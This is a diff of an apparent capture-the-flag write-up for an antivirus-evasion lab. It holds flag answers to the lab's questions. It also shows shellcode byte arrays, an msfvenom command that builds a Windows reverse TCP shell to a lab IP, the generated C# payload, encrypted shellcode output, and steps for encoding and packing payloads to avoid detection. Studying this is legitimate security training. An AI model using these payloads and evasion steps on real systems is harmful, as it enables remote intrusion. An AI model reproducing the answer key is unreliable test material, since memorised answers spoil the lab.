@@ -68,7 +68,8 @@ THM{H3ll0-W1nD0ws-Def3nd3r!}
 + Check the content of the extra section. What is the flag?`THM{PE-N3w-s3ction!}`
 
 ## Task 4  Introduction to Shellcode
-+ Modify your C program to execute the following shellcode. What is the flag?
++ Modify your C program to execute the following shellcode. What is the flag?`THM{y0ur-1s7-5h311c0d3}`
+
 ```C
 unsigned char message[] = {
   0xeb, 0x34, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x5e, 0x48, 0x89, 0xf0, 0x80,
@@ -417,7 +418,7 @@ dir
 + Do encryption algorithms use a key to encrypt strings or files? (yea/nay)`yea`
 
 ## Task 8  Shellcode Encoding and Encryption
-+ msfvenom LHOST=10.10.232.212 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
++ Generate Our Shellcode
 ```bash
 root@ip-10-10-232-212:~/Desktop# msfvenom LHOST=10.10.232.212 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -465,7 +466,7 @@ byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
 0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};
 ```
-
++ Put our shellcode on the `Encryptor.cs`
 ```C#
 using System;
 using System.Collections.Generic;
@@ -547,6 +548,7 @@ namespace Encrypter
 C:\Tools\CS Files>Encryptor.exe
 qADOr8OR8TIzIRUZDBthKGd6AvMxAMYZUzG6YCtp3xptA7gLYXo8lh4CAHr6MQDynx01NE9nEzjw+z5gVYmvpmE4YHq4c3TDD3d7eOG5s6lUSE0DtrlFVXsghBjGAys9unITaFWYrh17hvhzuBXcAEydfkj4egLh+AmMgj44MPMLwSG5AUh/XTl3CvAhkBUPuDkVezLxMgnGR3s9unIvaFWYDMA38Xkz42AMCRUVaiNwanJ4FRIFyN9ZcGDMwQwJFBF78iPbZN6rtxACjQ5CAGwSZkhNCmUwuNR7oLjoTEszMLjXep1WSEzwOXPZ5nJ1HcGpB7qIcIh/VnJPsp5/8NtaMiBUSBQKiVCxWTPegRgdBgKwfAPzaauIBcLxMc7ye6iVCfehPKbRzeZp3Y8nW3IhfbvRad2xDPGq3EVTzPQcyYkLMXkxe4tCOSxNSzN5MXNjYAQAxKlkLmZ/AuE+RRQKY5vNVPRlcBxMSnv0dRYr51QgBcLVL2FzY2AECR0CzLlwYnrenAXEin/w8HOJWJh3y7TmMQDge96ew0MKiXG2L1PegfO9/pEvcIiVtOnVsp57+vUaDycoQs2w0ww0iXQyJicnS2o4uOjM9A==
 ```
++ Modify our payload using the Encoder output on the `EncStageless.cs`
 ```C#
 using System;
 using System.Net;
@@ -607,7 +609,7 @@ public class Program {
 + Will packers help you obfuscate your malicious code to bypass AV solutions? (yea/nay)`yea`
 + Will packers often unpack the original code in-memory before running it? (yea/nay)`yea`
 + Are some packers detected as malicious by some AV solutions? (yea/nay)`yea`
-+ Follow the instructions to create a packed payload and upload it into the THM Antivirus Check at http://10.10.112.57/`No Answer Needed`
++ Follow the instructions to create a packed payload and upload it into the THM Antivirus Check at http://10.10.112.57/ `No Answer Needed`
 
 + Generate payload using msfvenom
 ```bash
